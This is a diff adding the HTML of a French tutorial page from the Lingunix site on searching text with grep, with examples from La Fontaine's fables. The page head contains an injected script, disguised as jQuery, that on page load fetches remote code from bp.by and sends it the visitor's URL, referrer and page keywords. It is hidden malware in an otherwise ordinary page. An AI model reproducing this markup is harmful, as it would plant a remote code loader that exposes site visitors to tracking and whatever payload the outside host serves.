@@ -1,0 +1,446 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr-fr" lang="fr-fr">
+
+<head>
+  <base href="http://www.lingunix.org/presentation-outils-unix/filtres-unix/3-recherche-chaines-caracteres-filtre-grep" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="filtre grep, grep linguistique, chercher chaines caractères, recherche grep, grep contexte, grep options, grep unix, grep plusieures chaines, grep flux, grep redirection, grep expression exact, grep commence, grep pipe, grep analyse texte, grep générique, grep chaine se termine, grep chaine qui commence, grep avec sed, filtre mot linux, filtre chaine unix, traitement linguistique, informatique linguiste" />
+  <meta name="keywords" content="filtre grep, grep linguistique, chercher chaines caractères, recherche grep, grep contexte, grep options, grep unix, grep plusieures chaines, grep flux, grep redirection, grep expression exact, grep commence, grep pipe, grep analyse texte, grep générique, grep chaine se termine, grep chaine qui commence, grep avec sed, filtre mot linux, filtre chaine unix, traitement linguistique, informatique linguiste" />
+  <meta name="title" content="La recherche de chaînes de caractères avec le filtre grep" />
+  <meta name="author" content="Lingunix" />
+  <meta name="description" content="La commande grep est une des plus importantes pour nous. Vous constaterez sa présence dans la quasi totalité de mes scripts. C'est avec cet outil que nous allons mettre dans un flux les données d'un fichier texte les résultat de nos script avant de les rediriger dans un fichier texte. Le filtre grep permet de trouver toutes les lignes d'un fichier texte dans lesquelles se trouve une chaîne de caractère recherchée." />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>La recherche de chaînes de caractères avec le filtre grep</title>
+  <link href="/component/jcomments/feed/com_content/3" rel="alternate" type="application/rss+xml" title="La recherche de chaînes de caractères avec le filtre grep" />
+  <link href="/templates/ja_purity/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="/components/com_jcomments/tpl/default/style.css?v=12" type="text/css" />
+  <script type="text/javascript" src="/components/com_jcomments/js/jcomments-v2.1.js?v=7"></script>
+  <script type="text/javascript" src="/components/com_jcomments/libraries/joomlatune/ajax.js?v=3"></script>
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+
+
+<link rel="stylesheet" href="http://www.lingunix.org/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="http://www.lingunix.org/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="http://www.lingunix.org/templates/ja_purity/css/template.css" type="text/css" />
+
+<script language="javascript" type="text/javascript" src="http://www.lingunix.org/templates/ja_purity/js/ja.script.js"></script>
+
+<script language="javascript" type="text/javascript">
+var rightCollapseDefault='show';
+var excludeModules='38';
+</script>
+<script language="javascript" type="text/javascript" src="http://www.lingunix.org/templates/ja_purity/js/ja.rightcol.js"></script>
+
+<link rel="stylesheet" href="http://www.lingunix.org/templates/ja_purity/css/menu.css" type="text/css" />
+
+<link rel="stylesheet" href="http://www.lingunix.org/templates/ja_purity/css/ja-sosdmenu.css" type="text/css" />
+<script language="javascript" type="text/javascript" src="http://www.lingunix.org/templates/ja_purity/js/ja.cssmenu.js"></script>
+
+<link rel="stylesheet" href="http://www.lingunix.org/templates/ja_purity/styles/background/lighter/style.css" type="text/css" />
+<link rel="stylesheet" href="http://www.lingunix.org/templates/ja_purity/styles/elements/blue/style.css" type="text/css" />
+
+<!--[if IE 7.0]>
+<style type="text/css">
+.clearfix {display: inline-block;}
+</style>
+<![endif]-->
+
+<style type="text/css">
+#ja-header,#ja-mainnav,#ja-container,#ja-botsl,#ja-footer {width: 960px;margin: 0 auto;}
+#ja-wrapper {min-width: 961px;}
+</style>
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://bp.by/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'I92930' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+</head>
+
+<body id="bd" class="fs3 Others" >
+<!-- JoomlaStatsActivated --><a name="Top" id="Top"></a>
+<ul class="accessibility">
+	<li><a href="#ja-content" title="Aller au contenu">Aller au contenu</a></li>
+	<li><a href="#ja-mainnav" title="Aller au menu principal">Aller au menu principal</a></li>
+	<li><a href="#ja-col1" title="Aller à la première colonne">Aller à la première colonne</a></li>
+	<li><a href="#ja-col2" title="Aller à la seconde colonne">Aller à la seconde colonne</a></li>
+</ul>
+
+<div id="ja-wrapper">
+
+<!-- BEGIN: HEADER -->
+<div id="ja-headerwrap">
+	<div id="ja-header" class="clearfix" style="background: url(http://www.lingunix.org/templates/ja_purity/images/header/header6.jpg) no-repeat top right;">
+
+	<div class="ja-headermask">&nbsp;</div>
+
+			<h1 class="logo-text">
+			<a href="/index.php" title="Lingunix : linguistique informatique"><span>Lingunix</span></a>
+		</h1>
+		<p class="site-slogan">Les outils unix appliqués à la recherche linguistique et psycholinguistique</p>
+	
+			<ul class="ja-usertools-font">
+	      <li><img style="cursor: pointer;" title="Augmenter la taille" src="http://www.lingunix.org/templates/ja_purity/images/user-increase.png" alt="Augmenter la taille" id="ja-tool-increase" onclick="switchFontSize('ja_purity_ja_font','inc'); return false;" /></li>
+		  <li><img style="cursor: pointer;" title="Taille par défaut" src="http://www.lingunix.org/templates/ja_purity/images/user-reset.png" alt="Taille par défaut" id="ja-tool-reset" onclick="switchFontSize('ja_purity_ja_font',3); return false;" /></li>
+		  <li><img style="cursor: pointer;" title="Diminuer la taille" src="http://www.lingunix.org/templates/ja_purity/images/user-decrease.png" alt="Diminuer la taille" id="ja-tool-decrease" onclick="switchFontSize('ja_purity_ja_font','dec'); return false;" /></li>
+		</ul>
+		<script type="text/javascript">var CurrentFontSize=parseInt('3');</script>
+		
+	
+	</div>
+</div>
+<!-- END: HEADER -->
+
+<!-- BEGIN: MAIN NAVIGATION -->
+<div id="ja-mainnavwrap">
+	<div id="ja-mainnav" class="clearfix">
+	<ul class="menu"><li class="item1"><a href="http://www.lingunix.org/"><span>Home</span></a></li><li class="parent active item2"><a href="/presentation-outils-unix"><span>Présentation des Outils Unix</span></a><ul><li class="item3"><a href="/presentation-outils-unix/outils-unix-linguistiques"><span>Les outils Unix Linguistiques</span></a></li><li id="current" class="active item4"><a href="/presentation-outils-unix/filtres-unix"><span>Les filtres Unix</span></a></li><li class="item18"><a href="/presentation-outils-unix/les-editeurs-unix"><span>Les éditeurs unix</span></a></li><li class="item20"><a href="/presentation-outils-unix/awk"><span>AWK</span></a></li></ul></li><li class="parent item7"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques"><span>Scripts Linguistiques</span></a><ul><li class="item8"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/scripts-faciles-apprendre"><span>Scripts Faciles</span></a></li><li class="item9"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/scripts-pratiques-outils"><span>Scripts Pratiques</span></a></li><li class="item10"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/calculs-frequences"><span>Calculs de Fréquences</span></a></li><li class="item13"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/extractions-informations"><span>Extractions d'informations</span></a></li><li class="item14"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/filtres-selectifs"><span>Filtres Séléctifs</span></a></li><li class="item15"><a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/script-awk-lexique"><span>Script Awk</span></a></li></ul></li><li class="item17"><a href="/algorithmes"><span>Algorithmes</span></a></li><li class="parent item6"><a href="/banque-donnees-linguistique"><span>Banque de données</span></a><ul><li class="item11"><a href="/banque-donnees-linguistique/filtres"><span>Filtres</span></a></li><li class="item12"><a href="/banque-donnees-linguistique/frequences"><span>Fréquences</span></a></li><li class="item16"><a href="/banque-donnees-linguistique/dictionnaires-bibliotheques"><span>Bibliothèques</span></a></li><li class="item21"><a href="/banque-donnees-linguistique/dictionnaires"><span>Dictionnaires</span></a></li><li class="item19"><a href="/banque-donnees-linguistique/cours-unix"><span>Cours Unix</span></a></li></ul></li><li class="item22"><a href="/tous"><span>Tous</span></a></li></ul>
+	</div>
+</div>
+<!-- END: MAIN NAVIGATION -->
+
+<div id="ja-containerwrap-f">
+<div id="ja-containerwrap2">
+	<div id="ja-container">
+	<div id="ja-container2" class="clearfix">
+
+		<div id="ja-mainbody-f" class="clearfix">
+
+		<!-- BEGIN: CONTENT -->
+		<div id="ja-contentwrap">
+		<div id="ja-content">
+
+			
+
+						<div id="ja-pathway">
+				
+			</div>
+			
+			
+<h2 class="contentheading">
+			La recherche de chaînes de caractères avec le filtre grep	</h2>
+
+
+<div class="article-tools">
+	<div class="article-meta">
+			<span class="createdate">
+			Dimanche, 24 Octobre 2010 21:17		</span>
+	
+			<span class="createby">
+			lingunix		</span>
+	
+		</div>
+
+		<div class="buttonheading">
+					
+						<span>
+			<a href="/presentation-outils-unix/filtres-unix/3-recherche-chaines-caracteres-filtre-grep?tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Imprimer" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/templates/ja_purity/images/printButton.png" alt="Imprimer"  /></a>			</span>
+			
+						<span>
+			<a href="/presentation-outils-unix/filtres-unix/3-recherche-chaines-caracteres-filtre-grep?format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/templates/ja_purity/images/pdf_button.png" alt="PDF"  /></a>			</span>
+						</div>
+	
+	</div>
+
+
+<div class="article-content">
+<p style="text-align: justify;">La commande grep est une des plus importantes pour nous. Vous constaterez sa présence dans la quasi totalité de mes scripts. C'est avec cet outil que nous allons mettre dans un <span style="color: #ff0000;">flux les données</span> d'un fichier texte les résultat de nos script avant de les <span style="color: #ff0000;">rediriger</span> dans un fichier texte.</p>
+<ul>
+<li><span style="color: #800000;"><strong>Le filtre grep permet de trouver toutes les lignes d'un fichier texte dans lesquelles se trouve une chaîne de caractère recherchée.</strong></span></li>
+</ul>
+<h4>Exemple :</h4>
+<p style="text-align: justify;">Nous cherchons toutes les lignes dans lesquelles se trouve le mot <strong>renard</strong> dans le livre 1 des fables de la Fontaine au format .txt (la_fontaine_fables_livre1_oudry.txt) :<br /><br /><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep renard la_fontaine_fables_livre1_oudry.txt</strong><br /><br /><span style="text-decoration: underline;">résultat :</span><br />...<br />Le <strong>renard</strong> s’en saisit et dit : « Mon bon Monsieur <br />...</p>
+<p style="text-align: justify;">Toutes les lignes contenant le mot renard serons renvoyées.</p>
+<h4 style="text-align: justify;">La commande grep possède de nombreuses options permettant d'affiner notre résultat dont voici les principales :</h4>
+<ul>
+<li>Ne pas tenir compte de la casse de la chaîne de caractère cherchée : -i</li>
+</ul>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep -i renard la_fontaine_fables_livre1_oudry.txt</strong></p>
+<p style="text-align: justify;"><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">Le Corbeau et le Renard ......................................................12 <br />...<br />Le renard s’en saisit et dit : « Mon bon Monsieur <br />...</p>
+<ul>
+<li>Renvoyer le contexte, c'est à dire la ligne avant, après ou les deux : -B1 -A1 -C1</li>
+</ul>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep -A1 renard la_fontaine_fables_livre1_oudry.txt</strong></p>
+<p style="text-align: justify;"><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">...<br />Le renard s’en saisit et dit : « Mon bon Monsieur <br />Apprenez que tout flatteur<br />...<br /><br />Ici on pourrait écrire grep -A2 pour avoir les deux lignes suivantes, ou -A3 pour les troisièmes, etc... et idem pour l'option -B et -C.<br /><span style="text-decoration: underline;">Petite info au sujet de ces trois options</span> : -A pour after, -B pour before et -C pour context.</p>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep -C2 renard la_fontaine_fables_livre1_oudry.txt</strong><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">Et pour montrer sa belle voix <br />Il ouvre un large bec laisse tomber sa proie. <br />Le <strong>renard</strong> s’en saisit et dit : « Mon bon Monsieur <br />Apprenez que tout flatteur <br />Vit aux dépens de celui qui l’écoute</p>
+<p style="text-align: justify;"> </p>
+<ul>
+<li>Renvoyer toutes les lignes sauf celles qui contiennent une chaîne de caractère donnée : -v</li>
+</ul>
+<p style="text-align: justify;"><br /><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep -v cochonnerie commentaires_publiques.txt</strong><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">Toutes les lignes sauf celles qui contiennent la chaîne de caractère "cochonnerie" serons envoyées dans le flux.</p>
+<p> </p>
+<ul>
+<li>Compter le nombre de lignes dans lesquelles se trouve une chaîne de caractères cherchée : -c</li>
+</ul>
+<p style="text-align: justify;"><br /><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep -c renard la_fontaine_fables_livre1_oudry.txt</strong><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">13</p>
+<p style="text-align: justify;"> </p>
+<ul>
+<li> Rechercher une expression exact : -w</li>
+</ul>
+<p style="text-align: justify;"><br />Il est nécessaire de préciser que grep cherche la présence d'une chaîne de caractère qui elle même peut être présente dans une chaîne de caractère plus grande. Par exemple la chaîne « <strong>onde</strong> » est présente dans la chaîne « m<strong>onde</strong> » et « r<strong>onde</strong> »...<br />Pour récupérer une chaîne de caractère exact nous utiliserons l'option w (word) :<br /><br /><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep -w onde la_fontaine_fables_livre1_oudry.txt</strong></p>
+<p style="text-align: justify;"><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">Dans le courant d’une <strong>onde</strong> pure. <br /><br /><br />L'option, -o de grep va faire écrire dans une colonne, autant de fois que la chaîne de caractère cherchée à été trouvée dans le texte. Nous verrons comment l'utiliser plus tard.<br /><br />Ces options de grep sont les principales et nous donnent une bonne idée de ce qu'on peut faire avec ce filtre.  Maintenant, voyons ce qu'on peut faire avec cette commande poussée dans un niveaux un peu plus avancé :<br /><br /><br /><br /></p>
+<h3>La commande grep dans tous ses états :</h3>
+<h4>Chercher plusieurs chaînes de caractères dans un texte :</h4>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep '\(renard\|corbeau\)' la_fontaine_fables_livre1_oudry.txt</strong><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">Toutes les lignes contenant la chaîne <strong>renard</strong> ou <strong>corbeau</strong> dans le texte la Fontaine seront envoyées dans le flux (donc sélectionnées). Vous pouvez ainsi mettre autant de mots que vous le souhaitez de cette manière dans grep.<br /><br /><span style="text-decoration: underline;">Note :</span> nous pouvons aisément ajouter toutes les options précédemment abordées à ce script, l'une n'empêche pas l'autre.<br /><br /></p>
+<h4><span style="text-decoration: underline;">Remarques  :</span></h4>
+<p style="text-align: justify;"> </p>
+<ul>
+<li>Le petit bâtonnet (pipe) | mit entre les chaînes renard et corbeau fonctionne ici comme un <strong>OU logique</strong>.</li>
+</ul>
+<ul>
+<li> Les backslash \ sont utilisés ici pour <strong>annuler</strong> la valeur des caractères spéciaux ( ) et | pour des raisons que nous aborderons plus tard.</li>
+</ul>
+<ul>
+<li> Le caractère simple quote ' est utilisé ici pour délimiter un <strong>espace</strong> dans lequel nous faisons usage de caractères spéciaux.</li>
+</ul>
+<p style="text-align: justify;"> </p>
+<h4>Chercher une expression exact dans un texte :</h4>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep Maître\ renard la_fontaine_fables_livre1_oudry.txt</strong><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">Maître renard par l’odeur alléché</p>
+<p style="text-align: justify;"><br />Seules les lignes contenant l'expression exact "Maître renard" sont acceptées, celles contenant maître ou renard ne sont pas retenues.<br /><br /></p>
+<h4><span style="text-decoration: underline;">Remarques :</span></h4>
+<p style="text-align: justify;"> </p>
+<p style="text-align: justify;">J'aurais due délimiter la chaîne Maître\ renard par des simple quotes, mais je ne l'ai pas fait par pure fainéantise, le résultat de ces deux variables étant les mêmes! Vous saurez désormais, que la fainéantise est une qualité requise chez l'informaticien qui cherchera toujours à systématiser le travail qu'il doit réaliser, dans l'unique but d'en faire le moins possible !<br /><br /></p>
+<h4>Chercher une chaîne de caractères qui commence par une ou un groupe de lettres en particulier :</h4>
+<p style="text-align: justify;">Nous débutons enfin à traiter d'un sujet qui commence à avoir un rapport avec la recherche linguiste et psycholinguistique, notamment en ce qui concerne la création de bases de données de chaînes de caractères possédant certaines caractéristiques. De nombreuses recherches étudient par exemple, la manière nous traitons le début ou la fin d'un mot en situation de lecture.<br /><br />Pour sélectionner une chaîne de caractère qui commence par une ou un groupe de lettres en particulier avec le filtre grep, nous utiliserons le caractère ^ (qui symbolise le début de ligne) .<br /><br /><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep ^re la_fontaine_fables_livre1_oudry.txt</strong></p>
+<p style="text-align: justify;"><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;"><strong>re</strong>commandable ; ce sont qualités au-dessus de ma portée. <br /><strong>re</strong>connaîtra dans cet auteur le vrai caractère et le vrai génie de <br /><strong>re</strong>ndais nouvelles par quelques traits qui en relevassent le goût. <br /><strong>re</strong>commande aux nourrices de les leur apprendre ; car on ne <br /><strong>re</strong>présentent confirme les personnes d’âge avancé dans les<br /><br /></p>
+<h4><span style="text-decoration: underline;">Remarques importantes :</span></h4>
+<p style="text-align: justify;"> </p>
+<p style="text-align: justify;">Comme je vous l'ai expliqué plus haut, la commande grep <span style="text-decoration: underline;">filtre les lignes qui contiennent une chaîne de caractères</span> cherchée. Le résultat de ce script nous a renvoyé toutes les lignes qui commencent par le groupe de lettre <strong>re</strong>.</p>
+<ul>
+<li> Pour obtenir l'ensemble des mots qui commence par le groupe de lettres re, nous seront obligés de faire appel à un autre outil : l'<a href="/presentation-outils-unix/les-editeurs-unix/29-introduction-a-sed-editeur-de-flux-pour-les-linguistes" title="éditeur sed unix">éditeur <span style="color: #800000;"><strong>sed</strong></span></a> (que nous verrons plus tard).</li>
+</ul>
+<ul>
+<li> Comme je vous l'ai promis, dans la « Présentation des outils Unix », le niveau de difficulté est croissant.</li>
+</ul>
+<ul>
+<li> Je vais implémenter ici un « sous-script » avec <a href="/presentation-outils-unix/les-editeurs-unix/29-introduction-a-sed-editeur-de-flux-pour-les-linguistes" title="introduction sed">sed</a> qui va nous permettre d'obtenir l'ensemble des mots qui commence par le groupe de lettres re. La méthode est simple. Il suffit de remplacer tous les espaces entre les mots par un retour chariot. La conséquence de cette astuce est que chaque mot de chaque phrase sera écrits sur une ligne. Nous pourrons ensuite filtrer chaque ligne (dans laquelle ne se trouve qu'un seul mot)  qui commence par le groupe de lettres re.</li>
+</ul>
+<p style="text-align: justify;">Cette astuce fait partie des grands classiques des Unixiens chargés du traitement de l'information écrite.<br /><br /></p>
+<h4>Le script qui remplace chaque espace par un retour chariot :</h4>
+<p style="text-align: justify;"> </p>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>sed -e 's/\ /\n/g'</strong><br /><br /><span style="text-decoration: underline;"> résultat :</span></p>
+<p style="text-align: justify;">Maître<br /> corbeau,<br /> sur<br /> un<br /> arbre<br /> perché<br /><br /></p>
+<h4><span style="text-decoration: underline;"> Script final qui filtre tous les mots d'un texte qui commence par re :</span></h4>
+<p style="text-align: justify;"><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><span style="color: #800000;"><strong>grep . la_fontaine_fables_livre1_oudry.txt |  sed -e 's/\ /\n/g | grep ^re</strong></span><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">recueil. <br />relâchât <br />remit <br />rend <br />reste <br />rendent <br />recommandable <br />reconnaîtra <br />rendais <br />relevassent <br />recommandable <br />rencontre <br />...<br /><br /></p>
+<h4><span style="text-decoration: underline;">Remarques très importantes :</span></h4>
+<p>Il y a deux choses dont j'aurais due vous parler avant, mais je ne voulais pas vous embrouiller :</p>
+<ul>
+<li> La première, le caractère . (le point) est un <strong>caractère générique</strong> pour grep qui symbolise tous les caractères.</li>
+</ul>
+<ul>
+<li> La deuxième, le caractère | (le pipe) permet de <strong>rediriger</strong> le résultat d'un script dans un autre script.</li>
+</ul>
+<p style="text-align: justify;"><br /><span style="text-decoration: underline;">Explications :</span><br /><br /></p>
+<ul>
+<li>Les script « grep . la_fontaine_fables_livre1_oudry.txt » va mettre toutes les lignes du texte étudié dans un <strong>flux de données</strong>.</li>
+</ul>
+<ul>
+<li>Le pipe ( | )va prendre ces données et les <strong>rediriger</strong> dans le script suivant ( sed -e 's/\ /\n/g) qui remplace tous les espaces par des retours chariots.</li>
+</ul>
+<ul>
+<li>Le deuxième pipe ( | ) va rediriger ce nouveau flux de mots (alignés verticalement par <a href="/presentation-outils-unix/les-editeurs-unix/29-introduction-a-sed-editeur-de-flux-pour-les-linguistes" title="sed unix">sed</a>) et l'envoyer dans le dernier script qui ne retient que les mots qui commencent par le groupe de lettres re. </li>
+</ul>
+<p style="text-align: justify;"> </p>
+<h4>Analogie de cet algorithme :</h4>
+<ul>
+<li>De nombreuses voitures roulent sur l'autoroute (le flux de mot = <strong>grep .</strong> ).</li>
+</ul>
+<ul>
+<li>Les douanes à hauteur d'un péage (le pipe = | ) alignent toutes les voitures sur une voies ( remplacent les espaces par des retour chariots = <strong>sed -e 's/\ /\n/g'</strong>) pour pouvoir les contrôler,</li>
+</ul>
+<ul>
+<li>Elles interceptent uniquement les voitures rouges (les mots qui commencent par re = <strong>grep ^re</strong>) .</li>
+</ul>
+<p style="text-align: justify;"> </p>
+<h4>Chercher une chaîne de caractères qui commence par une ou un groupe de lettres en particulier :</h4>
+<p style="text-align: justify;"><br />Pour sélectionner une chaîne de caractère qui se termine par une ou un groupe de lettres en particulier avec le filtre grep, nous utiliserons le caractère $ (qui symbolise la fin de ligne). Par exemple, pour récupérer les chaînes de caractères qui se terminent par <strong>er</strong> nous utiliserons le script suivant :<br /><br /><span style="text-decoration: underline;">script :</span></p>
+<p style="text-align: justify;"><strong>grep er$ la_fontaine_fables_livre1_oudry.txt</strong><br /><br /><span style="text-decoration: underline;">Remarques :</span></p>
+<p style="text-align: justify;">Nous ferons face exactement aux mêmes problèmes que précédemment, que nous résoudrons de la même manière :<br /><br /><span style="text-decoration: underline;">script final :</span></p>
+<p style="text-align: justify;"><span style="color: #800000;"><strong>grep . la_fontaine_fables_livre1_oudry.txt |  sed -e 's/\ /\n/g | grep er$</strong></span><br /><br /><span style="text-decoration: underline;">résultat :</span></p>
+<p style="text-align: justify;">appeler <br />marcher <br />habiller <br />m’empêcher <br />dernier <br />s’appliquer <br />attacher <br />envoyer <br />exiger <br />juger <br />considérer <br />porter <br />donner</p>
+<h3 style="text-align: justify;">Conclusions :</h3>
+<p style="text-align: justify;">Le filtre grep est un trés bon outil de filtrage, donc de recherche de chaînes de caractères. Vous savez maintenant transformer votre ordinateur en moteur de recherche interne ! Vous êtes aussi aptes à comprendre ces scripts : <a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques" title="scripts linguistiques">http://www.lingunix.org/scripts-linguistiques-dictionnaires-banques-bibliotheques</a></p></div>
+
+	<span class="modifydate">
+		Mise à jour le Jeudi, 31 Mars 2011 10:26	</span>
+
+<span class="article_separator">&nbsp;</span>
+<script type="text/javascript">
+<!--
+var jcomments=new JComments(3, 'com_content','/index.php?option=com_jcomments&amp;tmpl=component');
+jcomments.setList('comments-list');
+//-->
+</script>
+<div id="jc">
+<div id="comments"></div>
+<h4>Ajouter un Commentaire</h4>
+<a id="addcomments" href="#addcomments"></a>
+<form id="comments-form" name="comments-form" action="javascript:void(null);">
+<p>
+	<input id="comments-form-name" type="text" name="name" value="" maxlength="20" size="22" tabindex="1" />
+	<label for="comments-form-name">Nom (obligatoire)</label>
+</p>
+<p>
+	<input id="comments-form-email" type="text" name="email" value="" size="22" tabindex="2" />
+	<label for="comments-form-email">Adresse email (obligatoire)</label>
+</p>
+<p>
+	<input id="comments-form-homepage" type="text" name="homepage" value="" size="22" tabindex="3" />
+	<label for="comments-form-homepage">Url de votre site Web ou Blog</label>
+</p>
+<p>
+	<textarea id="comments-form-comment" name="comment" cols="65" rows="8" tabindex="5"></textarea>
+</p>
+<p>
+	<input class="checkbox" id="comments-form-subscribe" type="checkbox" name="subscribe" value="1" tabindex="5" />
+	<label for="comments-form-subscribe">Recevoir une notification par email lorsqu’une réponse est postée</label><br />
+</p>
+<p>
+	<img class="captcha" onclick="jcomments.clear('captcha');" id="comments-form-captcha-image" name="captcha-image" src="/index.php?option=com_jcomments&amp;task=captcha&amp;tmpl=component&amp;ac=44134" width="121" height="60" alt="Code de sécurité" /><br />
+	<span class="captcha" onclick="jcomments.clear('captcha');">Rafraîchir</span><br />
+	<input class="captcha" id="comments-form-captcha" type="text" name="captcha-refid" value="" size="5" tabindex="6" /><br />
+</p>
+<div id="comments-form-buttons">
+	<div class="btn" id="comments-form-send"><div><a href="#" tabindex="7" onclick="jcomments.saveComment();return false;" title="Enregistrer (ctrl+entrée)">Enregistrer</a></div></div>
+	<div class="btn" id="comments-form-cancel" style="display:none;"><div><a href="#" tabindex="8" onclick="return false;" title="Annuler">Annuler</a></div></div>
+	<div style="clear:both;"></div>
+</div>
+	<input type="hidden" name="object_id" value="3" />
+	<input type="hidden" name="object_group" value="com_content" />
+</form>
+<script type="text/javascript">
+<!--
+function JCommentsInitializeForm()
+{
+	var jcEditor = new JCommentsEditor('comments-form-comment', true);
+	jcEditor.addButton('b','Gras','Saisissez votre message :');
+	jcEditor.addButton('i','Italique','Saisissez votre message :');
+	jcEditor.addButton('u','Souligné','Saisissez votre message :');
+	jcEditor.addButton('url','Insérer un lien','Saisissez l’url :');
+	jcEditor.addButton('quote','Ajouter la balise de Citation [QUOTE]','Saisissez le texte à citer :');
+	jcEditor.initSmiles('http://www.lingunix.org/components/com_jcomments/images/smiles');
+	jcEditor.addSmile(':D','laugh.gif');
+	jcEditor.addSmile(':lol:','lol.gif');
+	jcEditor.addSmile(':-)','smile.gif');
+	jcEditor.addSmile(';-)','wink.gif');
+	jcEditor.addSmile('8)','cool.gif');
+	jcEditor.addSmile(':-|','normal.gif');
+	jcEditor.addSmile(':-*','whistling.gif');
+	jcEditor.addSmile(':oops:','redface.gif');
+	jcEditor.addSmile(':sad:','sad.gif');
+	jcEditor.addSmile(':cry:','cry.gif');
+	jcEditor.addSmile(':o','surprised.gif');
+	jcEditor.addSmile(':-?','confused.gif');
+	jcEditor.addSmile(':-x','sick.gif');
+	jcEditor.addSmile(':eek:','shocked.gif');
+	jcEditor.addSmile(':zzz','sleeping.gif');
+	jcEditor.addSmile(':P','tongue.gif');
+	jcEditor.addSmile(':roll:','rolleyes.gif');
+	jcEditor.addSmile(':sigh:','unsure.gif');
+	jcEditor.addCounter(1000, '', ' Caractères restants', 'counter');
+	jcomments.setForm(new JCommentsForm('comments-form', jcEditor));
+}
+
+if (window.addEventListener) {window.addEventListener('load',JCommentsInitializeForm,false);}
+else if (document.addEventListener){document.addEventListener('load',JCommentsInitializeForm,false);}
+else if (window.attachEvent){window.attachEvent('onload',JCommentsInitializeForm);}
+else {if (typeof window.onload=='function'){var oldload=window.onload;window.onload=function(){oldload();JCommentsInitializeForm();}} else window.onload=JCommentsInitializeForm;} 
+//-->
+</script>
+<div id="comments-footer" align="center"><a href="http://www.joomlatune.com" title="JComments" target="_blank">JComments</a></div>
+</div>
+
+						<div id="ja-banner">
+				<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/presentation-outils-unix/awk/31-introduction-awk-linguistes" class="latestnews">
+			﻿Introduction : AWK pour les linguistes</a>
+	</li>
+	<li class="latestnews">
+		<a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/scripts-pratiques-outils/30-remplacer-les-consonnes-et-les-voyelles-par-c-et-v-dans-uns-texte-avec-sed" class="latestnews">
+			Remplacer les consonnes et les voyelles par C et V dans un texte avec SED</a>
+	</li>
+	<li class="latestnews">
